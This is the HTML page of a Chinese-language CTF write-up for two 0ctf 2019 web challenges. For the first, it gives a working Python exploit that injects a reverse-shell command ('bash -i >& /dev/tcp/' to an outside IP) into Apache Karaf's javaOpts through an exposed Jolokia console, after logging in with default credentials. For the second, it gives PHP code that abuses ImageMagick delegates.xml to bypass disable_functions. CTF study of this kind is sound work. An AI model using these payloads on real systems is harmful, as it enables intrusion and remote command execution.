@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="n0b0dy">
+  <meta name="description" content="n0b0dy&#39;s personal site">
+  
+  
+  
+  <link rel="next" href="http://n0b0dycn.github.io/2019/alpha-21264/" />
+  <link rel="canonical" href="http://n0b0dycn.github.io/2019/0ctf-2019-quals-web-writeup/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           0ctf 2019 Quals Web writeup | n0b0dy&#39;s site
+       
+  </title>
+  <meta name="title" content="0ctf 2019 Quals Web writeup | n0b0dy&#39;s site">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "http://n0b0dycn.github.io/"
+    },
+    "articleSection" : "posts",
+    "name" : "0ctf 2019 Quals Web writeup",
+    "headline" : "0ctf 2019 Quals Web writeup",
+    "description" : "本次比赛两个web题都是RicterZ大佬出的，膜一波Orz
+Ghost Pepper 本题首先通过观察401的响应包找到HTTP Basic认证的用户名karaf：
+然后用密码karaf即可绕过认证。接下来通过目录爆破找到目录http://karaf:karaf@192.168.2.88:31337/jolokia/。到这里我们可以发现这是一个裸的jolokia控制台。
+jolokia是一个Java系统管理解决方案。其采用轻量级的Json格式传输数据，可以方便地管理系统中的Servlet。所以当应用暴露了jolokia目录的时候，基本上算是直接暴露出来一个webshell。我们可以通过访问http://karaf:karaf@192.168.2.88:31337/jolokia/list来查看可用的api，来寻找利用点。在本题中有三种解题方式：
+解法 1 通过karaf下bundle模块远程安装一个我们自己写的恶意bundle，反弹一个shell到自己的服务器上。参考https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi。但是由于我不熟悉Java编译出来的东西始终装不上Orz，等弄好了把整个项目代码扔github上面去= =
+解法 2 第二种方法应该算是最省事的方法了，即通过karaf下feature模块安装一个webconsole：
+之后我们访问http://192.168.2.88:31337/system/console/bundles就可以进入到webconsole的管理界面。在管理界面点Main -&gt; Goto即可进入console。
+在console中执行cat /flag即可得到flag：
+解法 3 使用karaf中的Instance模块，在安装一个新的instance的时候进行instance的命令行参数注入。我们看karaf源码：https://github.com/apache/karaf。在org/apache/karaf/instance/core/InstancesMBean.java文件中定义了MBean的接口：
+// Operations void startInstance(String name) throws MBeanException; void startInstance(String name, String opts) throws MBeanException; void startInstance(String name, String opts, boolean wait, boolean debug) throws MBeanException;  我们找startInstance方法的实现，在文件org/apache/karaf/instance/command/StartCommand.java中其调用了Instance的Start方法：
+跟进Instance类的start方法，其调用了InstanceService中的startInstance方法：
+继续跟进org/apache/karaf/instance/core/internal/InstanceServiceImpl.java，其调用了doStart方法：
+继续看doStart方法，其中有明显的命令拼接：
+在此处，我们发现javaOpt是我们可控的参数。在InstancesMBeanImpl中我们发现createInstance参数有一个就是javaOpt：
+于是我们给出攻击思路：
+ 创建一个新的Instance，在其javaOpt字段进行参数注入 开启这个新的Instance执行我们的命令 停止Instance 删除Instance  最后我们给出exp：
+import requests from pprint import pprint url = &quot;http://111.",
+    "inLanguage" : "en-us",
+    "author" : "n0b0dy",
+    "creator" : "n0b0dy",
+    "publisher": "n0b0dy",
+    "accountablePerson" : "n0b0dy",
+    "copyrightHolder" : "n0b0dy",
+    "copyrightYear" : "2019",
+    "datePublished": "2019-03-26 16:04:55 &#43;0800 &#43;0800",
+    "dateModified" : "2019-03-26 16:04:55 &#43;0800 &#43;0800",
+    "url" : "http://n0b0dycn.github.io/2019/0ctf-2019-quals-web-writeup/",
+    "wordCount" : "304",
+    "keywords" : [ "web","ctf", "n0b0dy&#39;s site"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="http://n0b0dycn.github.io/">n0b0dy&#39;s site</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="http://n0b0dycn.github.io/">n0b0dy&#39;s site</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">0ctf 2019 Quals Web writeup</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="http://n0b0dycn.github.io/" rel="author">n0b0dy</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2019-03-26 itemprop="datePublished">March 26, 2019</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="http://n0b0dycn.github.io/categories/ctf/"> CTF </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<p>本次比赛两个web题都是<a href="https://ricterz.me/" rel="nofollow noreferrer" target="_blank">RicterZ</a>大佬出的，膜一波Orz</p>
+
+<h2 id="ghost-pepper">Ghost Pepper</h2>
+
+<p>本题首先通过观察401的响应包找到HTTP Basic认证的用户名karaf：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/401.png" alt="401.png" class="lazyload"><figcaption class="image-caption">401.png</figcaption></figure></p>
+
+<p>然后用密码karaf即可绕过认证。接下来通过目录爆破找到目录<code>http://karaf:karaf@192.168.2.88:31337/jolokia/</code>。到这里我们可以发现这是一个裸的jolokia控制台。</p>
+
+<p>jolokia是一个Java系统管理解决方案。其采用轻量级的Json格式传输数据，可以方便地管理系统中的Servlet。所以当应用暴露了jolokia目录的时候，基本上算是直接暴露出来一个webshell。我们可以通过访问<code>http://karaf:karaf@192.168.2.88:31337/jolokia/list</code>来查看可用的api，来寻找利用点。在本题中有三种解题方式：</p>
+
+<h3 id="解法-1">解法 1</h3>
+
+<p>通过karaf下bundle模块远程安装一个我们自己写的恶意bundle，反弹一个shell到自己的服务器上。参考<a href="https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi" rel="nofollow noreferrer" target="_blank">https://github.com/p4-team/ctf/tree/master/2019-03-23-0ctf-quals/web_osgi</a>。但是由于我不熟悉Java编译出来的东西始终装不上Orz，等弄好了把整个项目代码扔github上面去= =</p>
+
+<h3 id="解法-2">解法 2</h3>
+
+<p>第二种方法应该算是最省事的方法了，即通过karaf下feature模块安装一个webconsole：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/webconsole.png" alt="webconsole" class="lazyload"><figcaption class="image-caption">webconsole</figcaption></figure></p>
+
+<p>之后我们访问<code>http://192.168.2.88:31337/system/console/bundles</code>就可以进入到webconsole的管理界面。在管理界面点Main -&gt; Goto即可进入console。</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/goto.png" alt="goto" class="lazyload"><figcaption class="image-caption">goto</figcaption></figure></p>
+
+<p>在console中执行<code>cat /flag</code>即可得到flag：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/console.png" alt="console" class="lazyload"><figcaption class="image-caption">console</figcaption></figure></p>
+
+<h3 id="解法-3">解法 3</h3>
+
+<p>使用karaf中的Instance模块，在安装一个新的instance的时候进行instance的命令行参数注入。我们看karaf源码：<a href="https://github.com/apache/karaf" rel="nofollow noreferrer" target="_blank">https://github.com/apache/karaf</a>。在<code>org/apache/karaf/instance/core/InstancesMBean.java</code>文件中定义了MBean的接口：</p>
+
+<pre><code class="language-java">// Operations
+void startInstance(String name) throws MBeanException;
+void startInstance(String name, String opts) throws MBeanException;
+void startInstance(String name, String opts, boolean wait, boolean debug) throws MBeanException;
+</code></pre>
+
+<p>我们找startInstance方法的实现，在文件<code>org/apache/karaf/instance/command/StartCommand.java</code>中其调用了Instance的Start方法：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/startCommand.png" alt="startCommand" class="lazyload"><figcaption class="image-caption">startCommand</figcaption></figure></p>
+
+<p>跟进Instance类的start方法，其调用了InstanceService中的startInstance方法：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/instanceImpl.png" alt="instanceImpl" class="lazyload"><figcaption class="image-caption">instanceImpl</figcaption></figure></p>
+
+<p>继续跟进<code>org/apache/karaf/instance/core/internal/InstanceServiceImpl.java</code>，其调用了doStart方法：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/startInstance.png" alt="startInstance" class="lazyload"><figcaption class="image-caption">startInstance</figcaption></figure></p>
+
+<p>继续看doStart方法，其中有明显的命令拼接：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/doStart.png" alt="doStart" class="lazyload"><figcaption class="image-caption">doStart</figcaption></figure></p>
+
+<p>在此处，我们发现javaOpt是我们可控的参数。在<code>InstancesMBeanImpl</code>中我们发现createInstance参数有一个就是javaOpt：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/mbean.png" alt="mbean" class="lazyload"><figcaption class="image-caption">mbean</figcaption></figure></p>
+
+<p>于是我们给出攻击思路：</p>
+
+<ol>
+<li>创建一个新的Instance，在其javaOpt字段进行参数注入</li>
+<li>开启这个新的Instance执行我们的命令</li>
+<li>停止Instance</li>
+<li>删除Instance</li>
+</ol>
+
+<p>最后我们给出exp：</p>
+
+<pre><code class="language-python">import requests
+from pprint import pprint
+
+url = &quot;http://111.186.63.207:31337/jolokia/&quot;
+
+create_instance = {
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;mbean&quot;:&quot;org.apache.karaf:name=root,type=instance&quot;,
+    &quot;operation&quot;: &quot;createInstance(java.lang.String,int,int,int,java.lang.String,java.lang.String,java.lang.String,java.lang.String)&quot;,
+    &quot;arguments&quot;: [
+        &quot;n0b0dy&quot;, # name
+        22, # ssh port
+        1099, # rmiRegistryPort
+        44444, # rmiServerPort
+        &quot;/opt/opendaylight-0.9.2/instances/n0b0dy&quot;, # location
+        &quot;|| bash -i &gt;&amp; /dev/tcp/149.28.194.202/33333 0&gt;&amp;1 #&quot;, # javaOpts
+        None, # features
+        None # featureURLs
+    ]
+}
+
+start_instance = {
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;mbean&quot;:&quot;org.apache.karaf:name=root,type=instance&quot;,
+    &quot;operation&quot;: &quot;startInstance(java.lang.String,java.lang.String)&quot;,
+    &quot;arguments&quot;: [
+        &quot;n0b0dy&quot;, # name
+        &quot;&quot;, # opts
+    ]
+}
+
+
+stop_instance = {
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;mbean&quot;:&quot;org.apache.karaf:name=root,type=instance&quot;,
+    &quot;operation&quot;: &quot;stopInstance&quot;,
+    &quot;arguments&quot;: [
+        &quot;n0b0dy&quot;, # name
+    ]
+}
+
+
+destory_instance = {
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;mbean&quot;:&quot;org.apache.karaf:name=root,type=instance&quot;,
+    &quot;operation&quot;: &quot;destroyInstance&quot;,
+    &quot;arguments&quot;: [
+        &quot;n0b0dy&quot;, # name
+    ]
+}
+
+headers = {
+    &quot;Authorization&quot;: &quot;Basic a2FyYWY6a2FyYWY=&quot;
+}
+
+exp = [create_instance, start_instance, stop_instance, destory_instance]
+for e in exp:
+    rep = requests.post(url, json=e, headers=headers)
+    pprint(rep.json())
+</code></pre>
+
+<h2 id="wallbreaker">Wallbreaker</h2>
+
+<p>这个题目提出了一种新的用imagick来绕过<code>disable_function</code>的方法。根据<a href="https://imagemagick.org/script/resources.php" rel="nofollow noreferrer" target="_blank">文档</a>描述，<code>delegate.xml</code>用于指定转换特定文件用的命令：</p>
+
+<blockquote>
+<p>Associate delegate programs with certain image formats. ImageMagick relies on a number of delegate programs to support certain image formats such as ufraw-batch to read raw camera formats or Ghostscript to read Postscript images. Use this configuration file to map an input or output format to an external delegate program.</p>
+</blockquote>
+
+<p>文档中还给出了一个<a href="https://imagemagick.org/source/delegates.xml" rel="nofollow noreferrer" target="_blank">示例</a>：</p>
+
+<pre><code class="language-xml">&lt;delegatemap xmlns=&quot;&quot;&gt;
+&lt;delegate xmlns=&quot;&quot; decode=&quot;bpg&quot; command=&quot;&quot;bpgdec&quot; -b 16 -o &quot;%o.png&quot; &quot;%i&quot;; /usr/bin/mv &quot;%o.png&quot; &quot;%o&quot;&quot;/&gt;
+...
+&lt;/delegatemap&gt;
+</code></pre>
+
+<p>我们可以看到<code>delegates.xml</code>中定义了很多命令执行的函数。那么我们可以自己定义<code>delegates.xml</code>文件吗？答案是可以的要不然这道题就没法做了2333</p>
+
+<p>Imagick有一些环境变量比较重要，比如<code>HOME</code>变量。根据文档的描述，这个变量是用来寻找config文件的跟路径：</p>
+
+<blockquote>
+<p>Set path to search for configuration files in $HOME/.config/ImageMagick if the directory exists.</p>
+</blockquote>
+
+<p>而Imagick的配置文件涉及到两个目录，即<code>$HOME/.config/ImageMagick</code>和<code>$HOME/.magick</code>。Imagick会在这两个目录下寻找delegates.xml文件，并进行解析。在delegates.xml中，我们可以对某个特定的文件后缀（此处为<code>foo</code>）指定其解析的方式。根据题目描述，我们将这个命令设置为需要执行的<code>/readflag</code>：</p>
+
+<pre><code class="language-xml">&lt;delegatemap&gt;&lt;delegate decode=&quot;foo&quot; command=&quot;/readflag &gt; /tmp//flag&quot;/&gt;&lt;/delegatemap&gt;
+</code></pre>
+
+<p>思路清晰以后，我们可以来写代码。首先在open_basedir的限制条件中找一个可以写的目录用来放我们的配置文件。题目的环境是tmp下面的一个根据ip生成的文件夹，在我们的环境中我们使用<code>/tmp</code>作为示例。同时我们打开error的显示便于调试：</p>
+
+<pre><code class="language-php">$home = '/tmp/';
+ini_set('display_errors', 1);
+</code></pre>
+
+<p>接下来我们将HOME环境变量设置为<code>tmp</code>并向<code>$HOME</code>下面写入我们的<code>delegates.xml</code>文件：</p>
+
+<pre><code class="language-php">putenv(&quot;HOME=$home/&quot;);
+mkdir(&quot;$home/.config/&quot;);
+mkdir(&quot;$home/.config/ImageMagick&quot;);
+file_put_contents(&quot;$home/.config/ImageMagick/delegates.xml&quot;,
+    &quot;&lt;delegatemap&gt;&lt;delegate decode=\&quot;foo\&quot; command=\&quot;/readflag &gt; $home/flag\&quot;/&gt;&lt;/delegatemap&gt;&quot;);
+</code></pre>
+
+<p>在delegate文件中，我们将<code>/readflag</code>的执行结果写入到<code>$HOME/flag</code>文件中，最后我们将结果读出来：</p>
+
+<pre><code class="language-php">touch(&quot;$home/test.foo&quot;);
+try {
+  $i = new Imagick(&quot;$home/test.foo&quot;);
+  $i-&gt;writeImage(&quot;$home/test.png&quot;);
+} catch(Exception $e) {
+  var_dump($e);
+}
+var_dump(file_get_contents(&quot;$home/flag&quot;));
+</code></pre>
+
+<p>经过这一波操作我们可以最终得到flag：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/0ctf-2019-Quals-Web-writeup/wallbreaker.png" alt="result" class="lazyload"><figcaption class="image-caption">result</figcaption></figure></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>n0b0dy </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=http://n0b0dycn.github.io/2019/0ctf-2019-quals-web-writeup/>http://n0b0dycn.github.io/2019/0ctf-2019-quals-web-writeup/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s): 
+            
+            <span class="tag"><a href="http://n0b0dycn.github.io/tags/web/">
+                    #web</a></span>
+            
+            <span class="tag"><a href="http://n0b0dycn.github.io/tags/ctf/">
+                    #ctf</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="http://n0b0dycn.github.io/">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+         
+        
+        <a href="http://n0b0dycn.github.io/2019/alpha-21264/" class="next" rel="next" title="Alpha 21264">Alpha 21264&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2011 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="http://n0b0dycn.github.io/">n0b0dy</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
